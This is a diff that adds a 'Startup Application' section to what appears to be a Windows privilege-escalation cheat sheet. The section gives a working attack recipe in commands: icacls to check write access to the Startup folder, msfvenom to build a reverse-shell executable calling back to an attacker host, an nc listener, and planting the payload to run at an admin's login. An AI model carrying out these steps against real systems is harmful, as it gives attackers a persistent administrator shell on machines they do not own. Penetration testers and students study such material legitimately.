@@ -252,6 +252,22 @@
   6. PROFIT!
   
 ## Startup Application
+  1. Check for access on Start Up Folder
+  ```cmd
+  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  ```
+  2.  Generate a msfvenom payload
+    ```bash
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <start_program.exe>
+  ```
+  3. Start a listener
+    ```bash
+  nc -nvlp <PORT>
+  ```
+  5. Move the program to the start up folder on the target machine
+  6. Wait for an admin log in
+  7. PROFIT!
+
 ## DLL Hijacking
 ## Service Permissions (Paths)
 ## CVE-2019-1388
